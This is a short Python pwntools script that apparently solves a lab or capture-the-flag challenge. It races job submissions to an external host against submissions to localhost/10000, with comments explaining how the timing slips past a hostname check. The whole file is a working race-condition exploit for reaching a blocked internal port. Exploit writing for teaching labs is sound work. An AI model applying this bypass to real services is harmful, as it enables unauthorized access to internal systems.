from pwn import *
import time
if __name__ == "__main__":
    r = remote('up.zoolab.org', 10932)
    for x in range(1000):
        r.sendline("g".encode('utf-8'))
        r.sendline("up.zoolab.org/10000".encode('utf-8'))
        # best server, who will REFUSE on port 10000
        # while other server will drop on port 10000 and make program block
        # we must use port 10000, since gethostbyname will only replace IP address
        r.sendline("g".encode('utf-8'))
        r.sendline("localhost/10000".encode('utf-8'))
        for i in range(5):
            r.sendline("v".encode('utf-8'))
            recv = r.recvuntil("==== Job Status ====")
            recv = r.recvuntil("==== Menu ====")
            print(recv.decode('utf-8'))

    r.close()